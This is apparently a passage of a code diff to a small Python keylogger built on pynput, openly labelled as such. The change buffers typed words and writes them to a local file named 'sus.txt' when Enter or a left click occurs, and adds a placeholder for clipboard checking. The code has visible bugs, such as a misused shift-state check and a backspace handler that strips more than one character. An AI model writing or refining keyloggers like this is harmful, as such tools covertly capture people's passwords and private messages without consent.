@@ -13,28 +13,44 @@ if missing:
 
 # key logger logic
 from pynput import keyboard,mouse
+from pynput.keyboard import Controller
 from threading import Lock
-
+word=""
 lock = Lock()
-def writeInFile(char):
+def writeInFile(s):
+    file = open("sus.txt",'a')
     lock.acquire()
     try: 
-        file = open("sus.txt",'a')
-        file.write(char)
+        file.write(s)
     except:
         print("Why r u still here")
     lock.release()
+    file.close()
 
 def handleKey(key):
     print(key)
-    if(hasattr(key,"char")):
-        writeInFile(key.char)
-    else:
-        writeInFile(str(key))
+    global word
+    if hasattr(key,"char"):
+        if key.char == 'v' and keyboard.Controller.shift_pressed == True:
+            # clipboard checking
+            print()
+        else:
+            word+= key.char
+    elif key == keyboard.Key.backspace and len(word)>0:
+        word = word.rstrip(word[-1])
+    elif key == keyboard.Key.space and len(word) != 0:
+        word += ' '
+    elif key == keyboard.Key.enter and len(word) != 0:
+        writeInFile(word+'\n')
+        print(word)
+        word=""     
     
 def handleClick(x,y,button,pressed):
-    if button == mouse.Button.left and pressed == 0:
-        writeInFile("click")
+    global word
+    if button == mouse.Button.left and pressed == 0 and len(word) != 0:
+        writeInFile(word+'\n')
+        print(word)
+        word=""
     
 if __name__ == "__main__":
     listener = keyboard.Listener(on_press=handleKey)
